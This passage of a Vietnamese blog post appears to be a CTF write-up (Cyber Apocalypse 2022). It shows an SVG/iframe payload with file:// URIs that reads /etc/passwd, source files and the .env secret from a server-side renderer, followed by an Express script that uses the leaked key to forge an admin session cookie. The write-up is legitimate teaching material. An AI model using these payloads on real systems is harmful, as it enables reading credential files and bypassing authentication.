+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.18.44.png" alt="Screen Shot 2022-05-15 at 13.18.44.png"></p>
+<p>Kết quả replace <code>&quot;</code> thành <code>\&quot;</code></p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.19.23.png" alt="Screen Shot 2022-05-15 at 13.19.23.png"></p>
+<p>Tiếp theo tôi cần phải đưa payload thành 1 dòng, bằng cách bỏ đi <code>\n</code></p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.19.59.png" alt="Screen Shot 2022-05-15 at 13.19.59.png"></p>
+<p>Sau khi thực hiện các bước trên, payload có được sẽ là:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg-dummy</span>&gt;&lt;/<span style="color:#f92672">svg-dummy</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;**file:///etc/passwd**\&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;100%\&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000px\&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">viewBox</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0</span> <span style="color:#a6e22e">0</span> <span style="color:#a6e22e">240</span> <span style="color:#a6e22e">80</span><span style="color:#960050;background-color:#1e0010">\&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000\&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000\&#34;</span> <span style="color:#a6e22e">xmlns</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;http://www.w3.org/2000/svg\&#34;</span>&gt;  &lt;<span style="color:#f92672">text</span> <span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0\&#34;</span> <span style="color:#a6e22e">y</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0\&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;Rrrrr\&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;demo\&#34;</span>&gt;data&lt;/<span style="color:#f92672">text</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
+</span></span></code></pre></div><p>Tôi thử gửi dữ liệu với payload lên server, bằng chức năng repeater của Burpsuite.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.21.14.png" alt="Screen Shot 2022-05-15 at 13.21.14.png"></p>
+<p>Kết quả của request thành công và được 1 đường dẫn ảnh png, thử truy cập vào.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.21.45.png" alt="Screen Shot 2022-05-15 at 13.21.45.png"></p>
+<p>Ok, thành công. Tôi đã có thể đọc được nội dung <code>/etc/passwd</code> của server.</p>
+<h2 id="leak-source-code-ứng-dụng">Leak source code ứng dụng.</h2>
+<p>Bây giờ tôi thử đọc source code của ứng dụng.</p>
+<p>Trước tiên là file <code>/app/index.js</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg-dummy</span>&gt;&lt;/<span style="color:#f92672">svg-dummy</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;file://**/app/index.js**\&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;100%\&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000px\&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">viewBox</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0</span> <span style="color:#a6e22e">0</span> <span style="color:#a6e22e">240</span> <span style="color:#a6e22e">80</span><span style="color:#960050;background-color:#1e0010">\&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000\&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000\&#34;</span> <span style="color:#a6e22e">xmlns</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;http://www.w3.org/2000/svg\&#34;</span>&gt;  &lt;<span style="color:#f92672">text</span> <span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0\&#34;</span> <span style="color:#a6e22e">y</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0\&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;Rrrrr\&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;demo\&#34;</span>&gt;data&lt;/<span style="color:#f92672">text</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
+</span></span></code></pre></div><p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.28.02.png" alt="Screen Shot 2022-05-15 at 13.28.02.png"></p>
+<p>Kết quả thành công và nội dung source code của file <code>/app/index.js</code></p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.28.28.png" alt="Screen Shot 2022-05-15 at 13.28.28.png"></p>
+<p>Phần trên tôi đã biết là có <code>/app/routes/index.js</code>, vậy tôi đọc tiếp source code của nó.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg-dummy</span>&gt;&lt;/<span style="color:#f92672">svg-dummy</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;file://**/app/routes/index.js**\&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;100%\&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000px\&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">viewBox</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0</span> <span style="color:#a6e22e">0</span> <span style="color:#a6e22e">240</span> <span style="color:#a6e22e">80</span><span style="color:#960050;background-color:#1e0010">\&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000\&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000\&#34;</span> <span style="color:#a6e22e">xmlns</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;http://www.w3.org/2000/svg\&#34;</span>&gt;  &lt;<span style="color:#f92672">text</span> <span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0\&#34;</span> <span style="color:#a6e22e">y</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0\&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;Rrrrr\&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;demo\&#34;</span>&gt;data&lt;/<span style="color:#f92672">text</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
+</span></span></code></pre></div><p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.24.32.png" alt="Screen Shot 2022-05-15 at 13.24.32.png"></p>
+<p>Kết quả thành công và nội dung source code của file <code>/app/routes/index.js</code></p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.25.08.png" alt="Screen Shot 2022-05-15 at 13.25.08.png"></p>
+<p>Vậy là đã đọc được source của <code>index</code> và <code>routes</code> của ứng dụng, hình ảnh tuy bị giới hạn độ dài không đọc được hết nội dung 1 file, tuy nhiên hiện tại như thế này là đủ.</p>
+<p>Sau khi đọc source của 2 file giờ đây mình có thêm một số thông tin như sau:</p>
+<ul>
+<li>
+<p><code>/app/.env</code> → Thường là nơi chưa file cấu hình <code>environment</code> của ứng dụng.</p>
+</li>
+<li>
+<p>Ứng dụng sử dụng <code>SESSION_SECRET_KEY</code> trong process.env (được load từ <code>/app/.env</code>) để tạo session.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.38.01.png" alt="Screen Shot 2022-05-15 at 13.38.01.png"></p>
+</li>
+<li>
+<p>Để có thể đọc được flag thì <code>session.username</code> phải là <code>admin</code></p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.37.01.png" alt="Screen Shot 2022-05-15 at 13.37.01.png"></p>
+</li>
+</ul>
+<p>Tôi đi giải quyết từng cái một nhé.</p>
+<ul>
+<li><strong><code>/app/.env</code> → Nơi chưa file cấu hình</strong> <code>environment</code> <strong>của ứng dụng</strong></li>
+</ul>
+<p>Tối đọc thử nó xem như thế nào.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">svg-dummy</span>&gt;&lt;/<span style="color:#f92672">svg-dummy</span>&gt;&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;file://**/app/.env**\&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;100%\&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000px\&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;&lt;<span style="color:#f92672">svg</span> <span style="color:#a6e22e">viewBox</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0</span> <span style="color:#a6e22e">0</span> <span style="color:#a6e22e">240</span> <span style="color:#a6e22e">80</span><span style="color:#960050;background-color:#1e0010">\&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000\&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;1000\&#34;</span> <span style="color:#a6e22e">xmlns</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;http://www.w3.org/2000/svg\&#34;</span>&gt;  &lt;<span style="color:#f92672">text</span> <span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0\&#34;</span> <span style="color:#a6e22e">y</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;0\&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;Rrrrr\&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">\&#34;demo\&#34;</span>&gt;data&lt;/<span style="color:#f92672">text</span>&gt;&lt;/<span style="color:#f92672">svg</span>&gt;
+</span></span></code></pre></div><p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.41.21.png" alt="Screen Shot 2022-05-15 at 13.41.21.png"></p>
+<p>Kết quả thành công và tôi đã có <code>SESSION_SECRET_KEY</code></p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.41.53.png" alt="Screen Shot 2022-05-15 at 13.41.53.png"></p>
+<p>Ở đây vì thông tin trả về là ảnh, không copy được thì có thể dùng Iphone hoặc download ảnh về dùng mấy tools tách chữ từ ảnh mà đọc nhé, ở đây mình dùng camera điện thoại để đọc và copy text ra.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/IMG_3682.png" alt="IMG_3682.PNG"></p>
+<pre tabindex="0"><code>SESSION_SECRET_KEY=5921719c3037662e94250307ec5ed1db
+</code></pre><p>Nhắc lại một chút:</p>
+<ul>
+<li>Ứng dụng sử dụng <code>SESSION_SECRET_KEY</code> để tạo <code>session</code></li>
+<li>Để có thể đọc được <code>flag</code> thì <code>session.username</code> phải là <code>admin</code></li>
+</ul>
+<p>Tôi thực hiện code 1 đoạn <code>nodejs express</code> để tái hiện lại cách tạo <code>session</code> bằng <code>SESSION_SECRET_KEY</code> vừa lấy được như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">session</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;cookie-session&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookieParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;cookie-parser&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">response</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">json</span>({<span style="color:#a6e22e">limit</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;2mb&#39;</span>}));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">cookieParser</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">session</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;session&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">keys</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;5921719c3037662e94250307ec5ed1db&#39;</span>],
+</span></span><span style="display:flex;"><span>}))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Server running on port 3000&#39;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>Chạy đoạn code trên và truy cập đến địa chỉ <code>[http://127.0.0.1:3000](http://127.0.0.1:3000)</code>.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.48.01.png" alt="Screen Shot 2022-05-15 at 13.48.01.png"></p>
+<p>Tôi có được được</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">session</span><span style="color:#f92672">=</span><span style="color:#a6e22e">eyJ1c2VybmFtZSI6ImFkbWluIn0</span><span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">sig</span><span style="color:#f92672">=</span><span style="color:#a6e22e">EYdvy2mhVoEznETyhYjNYFFZM8o</span>
+</span></span></code></pre></div><p>Bây giờ dùng thông tin <code>session</code> và <code>seesion.sig</code> có được gửi request đến <code>/dashboard</code>.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.54.14.png" alt="Screen Shot 2022-05-15 at 13.54.14.png"></p>
+<p>Kết quả thành công, mình đã có flag nè.</p>
+<p><code>HTB{fr4m3d_th3_s3cr37s_f0rg3d_th3_entrY}</code></p>
+<p>Tại thời điểm giải bài này có 53 flag được submit tính cả mình.</p>
+<p><img src="/images/posts/ctf/Cyber-Apocalypse-2022/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/Screen_Shot_2022-05-15_at_13.55.07.png" alt="Screen Shot 2022-05-15 at 13.55.07.png"></p>
+<h2 id="kết-luận">Kết luận</h2>
+<p>Qua bài này các bạn cũng có thể nhận thấy một điều là chỉ một sai sót không xử lý lỗi trước khi trả về + tin tưởng dữ liệu từ client gửi lên cũng khiến cho một ứng dụng web bị hack như thế nào.</p>
+<p>Cảm ơn các bạn đã dành thời gian đọc bài.</p>
+<p>Còn mấy bài còn lại rất hay, nhưng dạo này có vẻ bận, nếu như có thời gian mình sẽ writeup hết sau nhé.</p>
+
+              
+
+
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">THẺ ĐÁNH DẤU</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="/tags/ctf/">ctf</a>
+
+  <a class="tag tag--primary tag--small" href="/tags/cyber-apocalypse-2022/">Cyber Apocalypse 2022</a>
+
+  <a class="tag tag--primary tag--small" href="/tags/ctf-web-writeup/">ctf web writeup</a>
+
+  <a class="tag tag--primary tag--small" href="/tags/writeup/">writeup</a>
+
+                  </div>
+                
+              
+            
+            
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="/2022/03/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/" data-tooltip="Write up - THỬ THÁCH NGÀY 1: PHP TYPE JUGGLING “_SMARTCALC.EXE_”" aria-label="Trước: Write up - THỬ THÁCH NGÀY 1: PHP TYPE JUGGLING “_SMARTCALC.EXE_”">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Chia sẻ bài viết này">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/" title="Chia sẻ với Facebook" aria-label="Chia sẻ với Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/" title="Chia sẻ với Twitter" aria-label="Chia sẻ với Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/" title="Chia sẻ với Linkedin" aria-label="Chia sẻ với Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Để lại một bình luận">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Trở lại đầu trang">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+            
+  
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https:\/\/manhnv.com\/2022\/05\/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao\/';
+        
+          this.page.identifier = '\/2022\/05\/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao\/'
+        
+      };
+      (function() {
+        
+        
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+          document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+          return;
+        }
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'manhnv';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2022 <a href="https://manhnv.com">Manhnv</a><a href="//www.dmca.com/Protection/Status.aspx?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e" title="DMCA.com Protection Status" class="dmca-badge"> <img src ="https://images.dmca.com/Badges/dmca_protected_sml_120m.png?ID=26de1c55-21c3-4e09-9e8b-f7507ee02f5e"  alt="DMCA.com Protection Status" /></a>  <script src="https://images.dmca.com/Badges/DMCABadgeHelper.min.js"> </script>. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">Tiếp</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="/2022/03/writeup-thu-thach-ngay-1-php-type-juggling-smartcalc.exe/" data-tooltip="Write up - THỬ THÁCH NGÀY 1: PHP TYPE JUGGLING “_SMARTCALC.EXE_”" aria-label="Trước: Write up - THỬ THÁCH NGÀY 1: PHP TYPE JUGGLING “_SMARTCALC.EXE_”">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">Trước</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Chia sẻ bài viết này">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/" title="Chia sẻ với Facebook" aria-label="Chia sẻ với Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/" title="Chia sẻ với Twitter" aria-label="Chia sẻ với Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://manhnv.com/2022/05/hack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao/" title="Chia sẻ với Linkedin" aria-label="Chia sẻ với Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="Để lại một bình luận">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="Trở lại đầu trang">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmanhnv.com%2F2022%2F05%2Fhack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao%2F" aria-label="Chia sẻ với Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>Chia sẻ với Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fmanhnv.com%2F2022%2F05%2Fhack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao%2F" aria-label="Chia sẻ với Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>Chia sẻ với Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fmanhnv.com%2F2022%2F05%2Fhack-mot-ung-dung-web-thong-qua-loi-improper-error-handling-nhu-the-nao%2F" aria-label="Chia sẻ với Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>Chia sẻ với Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://manhnv.com/favicon.png" alt="Ảnh đại diện" />
